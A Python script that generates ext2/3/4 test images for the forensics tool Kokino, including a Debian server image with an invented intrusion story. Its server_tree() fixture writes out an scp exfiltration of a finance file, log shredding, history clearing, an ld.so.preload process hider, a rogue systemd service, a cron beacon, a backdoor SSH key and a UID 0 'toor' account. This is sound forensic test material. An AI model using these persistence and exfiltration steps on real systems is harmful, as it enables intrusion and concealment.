"""Small ext2, ext3 and ext4 volumes with a known story, for Kokino's tests.

Pure Python (no mkfs), 1 KiB blocks, one block group, 256-byte inodes:

    /hello.txt                  small file (inode 12), hard link /docs/hello-link.txt
    /docs/report.txt            3,000 bytes, three blocks
    /docs/notes/deep.txt        three folders down
    /big.bin                    40,960 bytes: ext4 in two extents (fragmented),
                                ext2/3 through the single indirect block
    /link                       fast symlink to docs/report.txt
    /deleted-secret.txt         deleted: its name stays in the slack of the
                                previous directory entry; dtime is set; ext2
                                keeps its block pointers, ext3/4 zero them
                                (as the kernels do)
    inode 20                    deleted with no name left anywhere (orphan)

ext3 and ext4 have a small journal in inode 8 holding one transaction: the
inode-table block of the deleted inodes as it was before the delete. ext4
uses extents and nanosecond times with creation time. Every time is a fixed
date in October 2026 so tests can check them. Checksums are not written
(Kokino does not verify them).

linux-server.img is an ext4 Debian-like server with one intrusion story for
the Linux artifacts (accounts, logons, shell history, packages, persistence,
USB, networks, journal); see server_tree(). Invented data, lab placeholders.

    python scripts/make_ext_fixture.py
"""
import base64
import os
import struct

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT = os.path.join(ROOT, "tests", "fixtures")

BS = 1024
BLOCKS = 4096                  # 4 MiB
INODES = 256
ISIZE = 256
FIRST_DATA = 1                 # superblock in block 1 with 1 KiB blocks
GDT_BLOCK = 2
BBITMAP, IBITMAP, ITABLE = 3, 4, 5
ITABLE_BLOCKS = INODES * ISIZE // BS     # 64
DATA_START = ITABLE + ITABLE_BLOCKS      # 69

T0 = 1792483530   # 2026-10-20 08:05:30 UTC
S_IFREG, S_IFDIR, S_IFLNK = 0o100000, 0o040000, 0o120000
FT_REG, FT_DIR, FT_LNK = 1, 2, 7


class Image:
    def __init__(self, kind):
        self.kind = kind
        self.ext4 = kind == "ext4"
        self.journal = kind in ("ext3", "ext4")
        self.data = bytearray(BLOCKS * BS)
        self.next_block = DATA_START
        self.used_blocks = set(range(0, DATA_START))
        self.inodes = {}          # number -> dict
        self.next_inode = 12

    # ------------------------------------------------------------ blocks
    def alloc(self, n, gap=0):
        self.next_block += gap
        start = self.next_block
        self.next_block += n
        self.used_blocks.update(range(start, start + n))
        return list(range(start, start + n))

    def write_blocks(self, blocks, payload):
        for i, b in enumerate(blocks):
            chunk = payload[i * BS:(i + 1) * BS]
            self.data[b * BS:b * BS + len(chunk)] = chunk

    # ------------------------------------------------------------ inodes
    def new_inode(self, num=None):
        if num is None:
            num = self.next_inode
            self.next_inode += 1
        return num

    def file_blocks(self, payload, fragmented=False):
        n = max(1, (len(payload) + BS - 1) // BS)
        if fragmented and n > 1:
            half = n // 2
            first = self.alloc(half)
            second = self.alloc(n - half, gap=5)
            blocks = first + second
        else:
            blocks = self.alloc(n)
        self.write_blocks(blocks, payload)
        return blocks

    def set_inode(self, num, mode, size, blocks, links=1, t=0, uid=1000, gid=1000, dtime=0, inline=None, keep_pointers=True):
        self.inodes[num] = dict(mode=mode, size=size, blocks=blocks, links=links, t=T0 + t, uid=uid, gid=gid,
                                dtime=dtime, inline=inline, keep=keep_pointers)

    def i_block(self, ino):
        """60 bytes of block map: extents (ext4) or direct/indirect pointers."""
        if ino["inline"] is not None:
            return ino["inline"].ljust(60, b"\0"), 0, 0
        blocks = ino["blocks"] if ino["keep"] else []
        if self.ext4:
            # Runs of contiguous blocks become extents.
            runs = []
            for i, b in enumerate(blocks):
                if runs and runs[-1][2] + runs[-1][1] == b:
                    runs[-1][1] += 1
                else:
                    runs.append([i, 1, b])
            hdr = struct.pack("<HHHHI", 0xF30A, len(runs), 4, 0, 0)
            ext = b"".join(struct.pack("<IHHI", lb, ln, 0, pb) for lb, ln, pb in runs)
            return (hdr + ext).ljust(60, b"\0"), 0x80000, 0
        ptrs = blocks[:12] + [0] * (12 - min(12, len(blocks)))
        ind = 0
        if len(blocks) > 12:
            ind = self.alloc(1)[0]
            rest = blocks[12:]
            self.data[ind * BS:ind * BS + 4 * len(rest)] = struct.pack("<%dI" % len(rest), *rest)
        return struct.pack("<15I", *(ptrs + [ind, 0, 0])), 0, (1 if ind else 0)

    def write_inode(self, num, ino):
        off = ITABLE * BS + (num - 1) * ISIZE
        self.data[off:off + ISIZE] = self.inode_bytes(num, ino)

    def inode_bytes(self, num, ino):
        iblock, flags, extra_blocks = self.i_block(ino)
        nblocks = (len(ino["blocks"]) + extra_blocks) * (BS // 512) if (ino["keep"] or self.kind == "ext2") else 0
        t = ino["t"]
        raw = struct.pack("<HHIIIIIHHII", ino["mode"], ino["uid"] & 0xFFFF, ino["size"] & 0xFFFFFFFF,
                          t + 300, t + 60, t, ino["dtime"], ino["gid"] & 0xFFFF, ino["links"], nblocks, flags)
        raw += b"\0" * 4                       # osd1
        raw += iblock                          # i_block
        raw += struct.pack("<IIII", num * 7 + 1, 0, ino["size"] >> 32, 0)
        raw += b"\0" * 12                      # osd2
        assert len(raw) == 128
        if self.ext4:
            nsec = lambda n: (n << 2)
            raw += struct.pack("<HHIIIIIII", 32, 0, nsec(250000000), nsec(123456789), nsec(500000000), t - 3600, nsec(42), 0, 0)
        return raw.ljust(ISIZE, b"\0")

    # ------------------------------------------------------------ directories
    def dir_payload(self, entries, delete=None):
        """entries: [(inode, name, ftype)]; `delete` names whose entry is
        removed the kernel's way: the previous entry absorbs its rec_len."""
        recs = []
        for inode, name, ft in entries:
            nb = name.encode()
            recs.append([inode, nb, ft, (8 + len(nb) + 3) & ~3])
        recs[-1][3] = BS - sum(r[3] for r in recs[:-1])
        assert recs[-1][3] >= 8 + len(recs[-1][1])
        pos, places = 0, []
        for r in recs:
            places.append(pos)
            pos += r[3]
        # The deleted record's bytes (inode number included) stay where they
        # were; only the previous record's rec_len grows over them.
        for i, r in enumerate(recs):
            if delete and r[1].decode() in delete:
                recs[i - 1][3] += r[3]
        out = bytearray(BS)
        for r, pos in zip(recs, places):
            inode, nb, ft, rl = r
            out[pos:pos + 8 + len(nb)] = struct.pack("<IHBB", inode, rl, len(nb), ft) + nb
        return bytes(out)

    # ------------------------------------------------------------ build
    def build(self):
        mk = lambda payload, **kw: (self.file_blocks(payload, **kw), len(payload))
        root, lost, docs, notes = 2, 11, self.new_inode(), self.new_inode()
        hello, report, deep, big, link, secret = (self.new_inode() for _ in range(6))
        orphan = 20
        self.next_inode = max(self.next_inode, 21)

        hb, hs = mk(b"Hello from Kokino's ext test volume.\n")
        rb, rs = mk((b"Quarterly report line, lab.test internal.\n" * 72)[:3000])
        db, ds = mk(b"deep note in /docs/notes\n")
        big_data = bytes((i * 37 + 11) & 0xFF for i in range(40960))
        bb, bsz = mk(big_data, fragmented=self.ext4)
        sb, ss = mk(b"SECRET: wire 1,200 EUR to account LAB-0001 (test data)\n")
        ob, os_ = mk(b"orphaned inode content, name long gone\n")

        self.set_inode(hello, S_IFREG | 0o644, hs, hb, links=2, t=10)
        self.set_inode(report, S_IFREG | 0o640, rs, rb, t=20)
        self.set_inode(deep, S_IFREG | 0o600, ds, db, t=30)
        self.set_inode(big, S_IFREG | 0o644, bsz, bb, t=40)
        target = b"docs/report.txt"
        self.set_inode(link, S_IFLNK | 0o777, len(target), [], t=50, inline=target)
        deleted_at = T0 + 3600
        zero = self.kind != "ext2"
        self.set_inode(secret, S_IFREG | 0o600, 0 if zero else ss, sb, links=0, t=60, dtime=deleted_at, keep_pointers=not zero)
        self.set_inode(orphan, S_IFREG | 0o644, 0 if zero else os_, ob, links=0, t=70, dtime=deleted_at + 60, keep_pointers=not zero)
        self.used_blocks -= set(sb) | set(ob)          # freed on delete
        alive = {secret: (ss, sb), orphan: (os_, ob)}

        dl = lambda me, parent, kids, delete=None: self.dir_payload([(me, ".", FT_DIR), (parent, "..", FT_DIR)] + kids, delete)
        notes_b = self.file_blocks(dl(notes, docs, [(deep, "deep.txt", FT_REG)]))
        docs_b = self.file_blocks(dl(docs, root, [(report, "report.txt", FT_REG), (notes, "notes", FT_DIR), (hello, "hello-link.txt", FT_REG)]))
        lost_b = self.file_blocks(dl(lost, root, []))
        root_b = self.file_blocks(dl(root, root, [(lost, "lost+found", FT_DIR), (docs, "docs", FT_DIR), (hello, "hello.txt", FT_REG),
                                                  (secret, "deleted-secret.txt", FT_REG), (big, "big.bin", FT_REG), (link, "link", FT_LNK)],
                                     delete={"deleted-secret.txt"}))
        self.set_inode(root, S_IFDIR | 0o755, BS, root_b, links=4, uid=0, gid=0)
        self.set_inode(lost, S_IFDIR | 0o700, BS, lost_b, links=2, uid=0, gid=0)
        self.set_inode(docs, S_IFDIR | 0o755, BS, docs_b, links=3, t=5)
        self.set_inode(notes, S_IFDIR | 0o750, BS, notes_b, links=2, t=6)
        if self.journal:
            jb = self.alloc(64)
            self.set_inode(8, S_IFREG | 0o600, 64 * BS, jb, uid=0, gid=0)
        for n, ino in self.inodes.items():
            self.write_inode(n, ino)
        if self.journal:
            self.write_journal(jb, alive)
        self.write_meta()
        return bytes(self.data)

    def write_journal(self, jb, alive):
        """One committed transaction (sequence 5) holding the inode-table
        block of the two deleted inodes as it was before they were deleted:
        how ext3/ext4 deleted files are recovered."""
        M = 0xC03B3998
        jsb = struct.pack(">III", M, 4, 0) + struct.pack(">IIIII", BS, 64, 1, 6, 0) + bytes(36) + bytes(range(16))
        self.data[jb[0] * BS:jb[0] * BS + len(jsb)] = jsb
        nums = sorted(alive)
        blk = ITABLE + (nums[0] - 1) * ISIZE // BS
        assert all(ITABLE + (n - 1) * ISIZE // BS == blk for n in nums)
        copy = bytearray(self.data[blk * BS:(blk + 1) * BS])
        for n in nums:
            size, blocks = alive[n]
            ino = dict(self.inodes[n], size=size, blocks=blocks, links=1, dtime=0, keep=True)
            o = (n - 1) * ISIZE % BS
            copy[o:o + ISIZE] = self.inode_bytes(n, ino)
        desc = struct.pack(">III", M, 1, 5) + struct.pack(">IHH", blk, 0, 8) + bytes(range(16))   # LAST_TAG, uuid follows
        commit = struct.pack(">III", M, 2, 5)
        for b, payload in ((jb[1], desc), (jb[2], bytes(copy)), (jb[3], commit)):
            self.data[b * BS:b * BS + len(payload)] = payload

    def write_meta(self):
        compat = 0x20 | (0x4 if self.journal else 0)              # dir_index, has_journal
        incompat = 0x2 | (0x40 if self.ext4 else 0)                # filetype, extents
        ro = 0x1 | 0x2 | ((0x8 | 0x20 | 0x40) if self.ext4 else 0)  # sparse, large_file, (huge, dir_nlink, extra_isize)
        used_inodes = {n for n, i in self.inodes.items() if i["links"] > 0} | set(range(1, 12))
        free_inodes = INODES - len(used_inodes)
        free_blocks = BLOCKS - len(self.used_blocks)
        sb = struct.pack("<IIIIIIIIIIIIIHHHHHHIIIIHH", INODES, BLOCKS, 0, free_blocks, free_inodes, FIRST_DATA, 0, 0,
                         8192, 8192, INODES, T0 + 7200, T0 + 7200, 3, 0xFFFF, 0xEF53, 1, 1, 0, T0, 0, 0, 1, 0, 0)
        sb += struct.pack("<IHHIII", 11, ISIZE, 0, compat, incompat, ro)
        sb += bytes(range(16))                                   # uuid
        sb += self.kind.upper().encode().ljust(16, b"\0")        # volume name
        sb += b"/mnt/evidence".ljust(64, b"\0")                  # last mounted on
        sb = sb.ljust(0xE0, b"\0") + struct.pack("<I", 8 if self.journal else 0)
        sb = sb.ljust(0x108, b"\0") + struct.pack("<I", T0)      # mkfs time
        sb = sb.ljust(0x15C, b"\0") + struct.pack("<HH", 32 if self.ext4 else 0, 32 if self.ext4 else 0)
        sb = sb.ljust(1024, b"\0")
        self.data[1024:2048] = sb
        gd = struct.pack("<IIIHHHHIHHHH", BBITMAP, IBITMAP, ITABLE, free_blocks, free_inodes, 4, 0, 0, 0, 0, 0, 0)
        self.data[GDT_BLOCK * BS:GDT_BLOCK * BS + 32] = gd
        bm = bytearray(BS)
        for b in self.used_blocks:
            i = b - FIRST_DATA
            if 0 <= i < 8192:
                bm[i // 8] |= 1 << (i % 8)
        for i in range(BLOCKS - FIRST_DATA, 8192):               # past the end: in use
            bm[i // 8] |= 1 << (i % 8)
        self.data[BBITMAP * BS:BBITMAP * BS + BS] = bm
        im = bytearray(BS)
        for n in used_inodes:
            im[(n - 1) // 8] |= 1 << ((n - 1) % 8)
        for i in range(INODES, BS * 8):
            im[i // 8] |= 1 << (i % 8)
        self.data[IBITMAP * BS:IBITMAP * BS + BS] = im


# ---------------------------------------------------------------- Linux server

def tzif(abbr, utoff, rule):
    """A TZif v2 file with no transitions: one type plus the POSIX rule."""
    body = struct.pack(">ibb", utoff, 0, 0) + abbr.encode() + b"\0"
    hdr = lambda: b"TZif2" + bytes(15) + struct.pack(">6I", 0, 0, 0, 0, 1, len(abbr) + 1)
    return hdr() + body + hdr() + body + b"\n" + rule.encode() + b"\n"


def utmp(ty, line, user, host, t):
    r = bytearray(384)
    struct.pack_into("<hxxi", r, 0, ty, 1000)
    r[8:8 + len(line)] = line.encode()
    r[44:44 + len(user)] = user.encode()
    r[76:76 + len(host)] = host.encode()
    struct.pack_into("<ii", r, 340, t, 0)
    return bytes(r)


def lz4_literals(data):
    """journald's LZ4 form: the size as 8 bytes, then one LZ4 block that
    holds the data as literals (a valid block, if not a small one)."""
    n = len(data)
    block = bytearray([0xF0])
    rest = n - 15
    while rest >= 255:
        block.append(255)
        rest -= 255
    block.append(rest)
    return struct.pack("<Q", n) + bytes(block) + data


def journal(entries, compress=None):
    """A small systemd journal (regular mode): each entry is (realtime
    microseconds, {field: value}). `compress` maps a field value to "xz" or
    "lz4": that data object is stored compressed, as journald does with
    long fields."""
    import lzma
    compress = compress or {}
    out = bytearray(256)
    out[:8] = b"LPKSHHRH"
    objs = bytearray()
    datas = {}

    def obj(kind, payload):
        o = bytearray(64) + payload
        o[0] = kind
        struct.pack_into("<Q", o, 8, len(o))
        while len(o) % 8:
            o.append(0)
        return o

    for _, fields in entries:
        for kv in fields.items():
            if kv not in datas:
                datas[kv] = 256 + len(objs)
                raw = ("%s=%s" % kv).encode()
                how = compress.get(kv[1])
                if how == "xz":
                    o = obj(1, lzma.compress(raw, format=lzma.FORMAT_XZ))
                    o[1] = 1
                elif how == "lz4":
                    o = obj(1, lz4_literals(raw))
                    o[1] = 2
                else:
                    o = obj(1, raw)
                objs += o
    for t, fields in entries:
        items = b"".join(struct.pack("<QQ", datas[kv], 0) for kv in fields.items())
        e = obj(3, items)
        struct.pack_into("<QQ", e, 16, 1, t)
        objs += e
    out += objs
    struct.pack_into("<QQ", out, 88, 256, len(objs))
    return bytes(out)


MAIL_SPOOL = (
    "From alice@lab.test Tue Oct 20 10:05:30 2026\r\n"
    "Return-Path: <alice@lab.test>\r\n"
    "Date: Tue, 20 Oct 2026 10:05:30 +0200\r\n"
    "From: Alice <alice@lab.test>\r\n"
    "To: bob@lab.test\r\n"
    "Subject: =?UTF-8?B?UTMgcGxhbiDigJMgY29uZmlkZW50aWFs?=\r\n"
    "Message-ID: <1@lab.test>\r\n"
    "MIME-Version: 1.0\r\n"
    "Content-Type: multipart/mixed; boundary=\"XYZ\"\r\n"
    "\r\n"
    "--XYZ\r\n"
    "Content-Type: text/plain; charset=iso-8859-1\r\n"
    "Content-Transfer-Encoding: quoted-printable\r\n"
    "\r\n"
    "Move the funds to the caf=E9 account to=\r\n"
    "night.\r\n"
    "--XYZ\r\n"
    "Content-Type: application/pdf; name=\"ledger.pdf\"\r\n"
    "Content-Disposition: attachment; filename=\"ledger.pdf\"\r\n"
    "Content-Transfer-Encoding: base64\r\n"
    "\r\n"
    "JVBERi0xLjQKJcOkw7w=\r\n"
    "--XYZ--\r\n"
    "\r\n"
    "From bob@lab.test Wed Oct 21 09:00:00 2026\n"
    "Date: Wed, 21 Oct 2026 09:00:00 +0000\n"
    "From: bob@lab.test\n"
    "To: Alice <alice@lab.test>\n"
    "Subject: Re: wipe the laptop\n"
    "Content-Type: text/html; charset=utf-8\n"
    "\n"
    "<p>Done. Used <b>sdelete</b> on everything.</p>\n"
)

SAVED_EML = (
    "Date: Thu, 22 Oct 2026 07:45:00 +0000\n"
    "From: it-support@lab.test\n"
    "To: alice@lab.test\n"
    "Subject: Password reset\n"
    "Content-Type: text/plain; charset=utf-8\n"
    "\n"
    "Your new VPN password is in the attached note.\n"
)


def server_tree():
    """A small Debian server with one intrusion story (invented lab data).
    Local zone Europe/Skopje (UTC+2 in October)."""
    L = lambda t: T0 + t                          # seconds after 08:05:30 UTC
    pub = base64.b64encode(b"\0\0\0\x0bssh-ed25519\0\0\0\x20" + bytes(range(32))).decode()
    auth = "\n".join([
        "Oct 20 10:10:01 lab-srv sshd[811]: Accepted publickey for alice from 192.0.2.10 port 50122 ssh2: ED25519 SHA256:lab",
        "Oct 20 10:12:44 lab-srv sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt install nmap",
        "Oct 20 10:20:03 lab-srv sshd[900]: Failed password for invalid user admin from 198.51.100.7 port 4242 ssh2",
        "Oct 20 10:20:09 lab-srv sshd[900]: Failed password for invalid user admin from 198.51.100.7 port 4242 ssh2",
        "Oct 20 10:31:15 lab-srv useradd[1001]: new user: name=svc-backup, UID=1001, GID=1001, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/0",
        "Oct 20 10:40:00 lab-srv sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/shred -u /var/log/auth.log.1",
        ""])
    syslog = "\n".join([
        "Oct 20 09:59:58 lab-srv kernel: [    0.000000] Linux version 6.1.0-lab-amd64 (debian-kernel@lists.debian.org) #1 SMP",
        "Oct 20 10:15:00 lab-srv kernel: [  900.101010] usb 1-1: New USB device found, idVendor=0781, idProduct=5581, bcdDevice= 1.00",
        "Oct 20 10:15:00 lab-srv kernel: [  900.101020] usb 1-1: Product: Ultra",
        "Oct 20 10:15:00 lab-srv kernel: [  900.101030] usb 1-1: Manufacturer: SanDisk",
        "Oct 20 10:15:00 lab-srv kernel: [  900.101040] usb 1-1: SerialNumber: 4C530001230920115045",
        ""])
    history = "\n".join(["#%d\nls -la" % L(7300), "#%d\nscp /srv/finance/q3.xlsx alice@192.0.2.10:/tmp/" % L(7400),
                         "#%d\nshred -u ~/notes.txt" % L(7500), "#%d\nhistory -c" % L(7600), ""])
    machine = "4f6c6162000000000000000000000001"
    return {
        "/etc/os-release": 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nNAME="Debian GNU/Linux"\nVERSION_ID="12"\nVERSION="12 (bookworm)"\nID=debian\n',
        "/etc/hostname": "lab-srv\n",
        "/etc/timezone": "Europe/Skopje\n",
        "/etc/localtime": ("link", "../usr/share/zoneinfo/Europe/Skopje"),
        "/usr/share/zoneinfo/Europe/Skopje": tzif("CET", 3600, "CET-1CEST,M3.5.0,M10.5.0/3"),
        "/etc/machine-id": machine + "\n",
        "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                       "alice:x:1000:1000:Alice Lab,,,:/home/alice:/bin/bash\nsvc-backup:x:1001:1001::/home/svc-backup:/bin/bash\n"
                       "toor:x:0:0::/root:/bin/bash\nbob:x:1002:1002:Bob Lab:/home/bob:/bin/bash\n",
        "/etc/shadow": "root:$y$j9T$labsalt$labhash:20381:0:99999:7:::\ndaemon:*:20000:0:99999:7:::\nalice:$6$labsalt$labhash:20381:0:99999:7:::\n"
                       "svc-backup::20381:0:99999:7:::\ntoor:$6$labsalt$labhash:20381:0:99999:7:::\nbob:!:20381:0:99999:7:::\n",
        "/etc/group": "root:x:0:\nsudo:x:27:alice\nalice:x:1000:\n",
        "/etc/hosts": "127.0.0.1 localhost\n127.0.1.1 lab-srv\n203.0.113.66 update.lab.test\n",
        "/etc/ld.so.preload": "/usr/lib/x86_64-linux-gnu/libprocesshider.so\n",
        "/etc/crontab": "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n",
        "/etc/systemd/system/sysupdate.service": "[Unit]\nDescription=System update helper\n[Service]\nExecStart=/dev/shm/.sysupdate --quiet\n[Install]\nWantedBy=multi-user.target\n",
        "/etc/NetworkManager/system-connections/LabWiFi.nmconnection": "[connection]\nid=LabWiFi\ntype=wifi\ntimestamp=%d\n[wifi]\nssid=LabWiFi\n[wifi-security]\nkey-mgmt=wpa-psk\n[ipv4]\naddress1=192.0.2.20/24,192.0.2.1\n" % L(3000),
        "/var/lib/dhcp/dhclient.eth0.leases": 'lease {\n  interface "eth0";\n  fixed-address 192.0.2.20;\n  option routers 192.0.2.1;\n  option dhcp-server-identifier 192.0.2.1;\n  option domain-name "lab.test";\n}\n',
        "/var/spool/cron/crontabs/alice": "*/5 * * * * /tmp/.x/beacon.sh >/dev/null 2>&1\n",
        "/var/lib/dpkg/status": "Package: openssh-server\nStatus: install ok installed\nArchitecture: amd64\nVersion: 1:9.2p1-2\nDescription: secure shell (SSH) server\n\n"
                                "Package: nmap\nStatus: install ok installed\nArchitecture: amd64\nVersion: 7.93+dfsg1-1\nDescription: The Network Mapper\n",
        "/var/log/dpkg.log": "2026-10-20 10:12:50 install nmap:amd64 <none> 7.93+dfsg1-1\n2026-10-20 10:12:51 status installed nmap:amd64 7.93+dfsg1-1\n",
        "/var/log/apt/history.log": "\nStart-Date: 2026-10-20  10:12:48\nCommandline: apt install nmap\nRequested-By: alice (1000)\nInstall: nmap:amd64 (7.93+dfsg1-1), libpcap0.8:amd64 (1.10.3-1, automatic)\nEnd-Date: 2026-10-20  10:12:52\n",
        "/var/log/auth.log": (auth, L(90000)),
        "/var/log/syslog": (syslog, L(90000)),
        "/var/log/wtmp": b"".join([utmp(2, "~", "reboot", "6.1.0-lab-amd64", L(6868)), utmp(7, "pts/0", "alice", "192.0.2.10", L(7471)),
                                   utmp(8, "pts/0", "", "", L(9000)), utmp(1, "~~", "shutdown", "6.1.0-lab-amd64", L(10000))]),
        "/var/log/btmp": utmp(6, "ssh:notty", "admin", "198.51.100.7", L(8073)),
        # Both messages stored compressed (XZ and LZ4), as journald does with long fields.
        "/var/log/journal/%s/system.journal" % machine: journal([
            (L(7200) * 1000000, {"SYSLOG_IDENTIFIER": "sshd", "_HOSTNAME": "lab-srv", "MESSAGE": "Accepted password for bob from 203.0.113.9 port 40022 ssh2"}),
            (L(7250) * 1000000, {"SYSLOG_IDENTIFIER": "sshd", "_HOSTNAME": "lab-srv", "MESSAGE": "Failed password for root from 203.0.113.9 port 40030 ssh2"}),
        ], {"Accepted password for bob from 203.0.113.9 port 40022 ssh2": "xz", "Failed password for root from 203.0.113.9 port 40030 ssh2": "lz4"}),
        "/home/alice/.bash_history": history,
        "/var/mail/alice": MAIL_SPOOL,
        "/home/alice/Downloads/reset.eml": SAVED_EML,
        "/home/alice/.ssh/authorized_keys": 'ssh-ed25519 %s alice@lab-laptop\ncommand="/tmp/.x/k" ssh-ed25519 %s backdoor@lab.test\n' % (pub, pub),
        "/home/alice/.ssh/known_hosts": "192.0.2.10 ssh-ed25519 %s\n" % pub,
        "/root/.bash_history": ("link", "/dev/null"),
    }


def build_server():
    img = Image("ext4")
    tree = server_tree()
    dirs = {"/": 2}
    kids = {"/": [(11, "lost+found", FT_DIR)]}
    paths = sorted(tree)
    for p in paths:
        cur = "/"
        for part in p.split("/")[1:-1]:
            nxt = cur.rstrip("/") + "/" + part
            if nxt not in dirs:
                dirs[nxt] = img.new_inode()
                kids[nxt] = []
                kids[cur].append((dirs[nxt], part, FT_DIR))
            cur = nxt
    for i, p in enumerate(paths):
        spec = tree[p]
        n = img.new_inode()
        parent, name = p.rsplit("/", 1)
        parent = parent or "/"
        if isinstance(spec, tuple) and spec[0] == "link":
            target = spec[1].encode()
            img.set_inode(n, S_IFLNK | 0o777, len(target), [], t=100 + i, uid=0, gid=0, inline=target)
            kids[parent].append((n, name, FT_LNK))
            continue
        mtime = None
        if isinstance(spec, tuple):
            spec, mtime = spec
        data = spec.encode() if isinstance(spec, str) else spec
        owner = 1000 if p.startswith("/home/alice") else 0
        img.set_inode(n, S_IFREG | 0o644, len(data), img.file_blocks(data), t=100 + i, uid=owner, gid=owner)
        if mtime:
            img.inodes[n]["t"] = mtime
        kids[parent].append((n, name, FT_REG))
    lost = img.file_blocks(img.dir_payload([(11, ".", FT_DIR), (2, "..", FT_DIR)]))
    img.set_inode(11, S_IFDIR | 0o700, BS, lost, links=2, uid=0, gid=0)
    for d in sorted(dirs, key=lambda x: -x.count("/")):
        parent = d.rsplit("/", 1)[0] or "/"
        payload = img.dir_payload([(dirs[d], ".", FT_DIR), (dirs[parent], "..", FT_DIR)] + kids[d])
        subdirs = sum(1 for k in kids[d] if k[2] == FT_DIR)
        img.set_inode(dirs[d], S_IFDIR | 0o755, BS, img.file_blocks(payload), links=2 + subdirs, uid=0, gid=0)
    for n, ino in img.inodes.items():
        img.write_inode(n, ino)
    img.write_meta()
    return bytes(img.data)


def main():
    for kind in ("ext2", "ext3", "ext4"):
        data = Image(kind).build()
        with open(os.path.join(OUT, "%s.img" % kind), "wb") as f:
            f.write(data)
        print(kind, len(data), "bytes")
    data = build_server()
    with open(os.path.join(OUT, "linux-server.img"), "wb") as f:
        f.write(data)
    print("linux-server", len(data), "bytes")


if __name__ == "__main__":
    main()
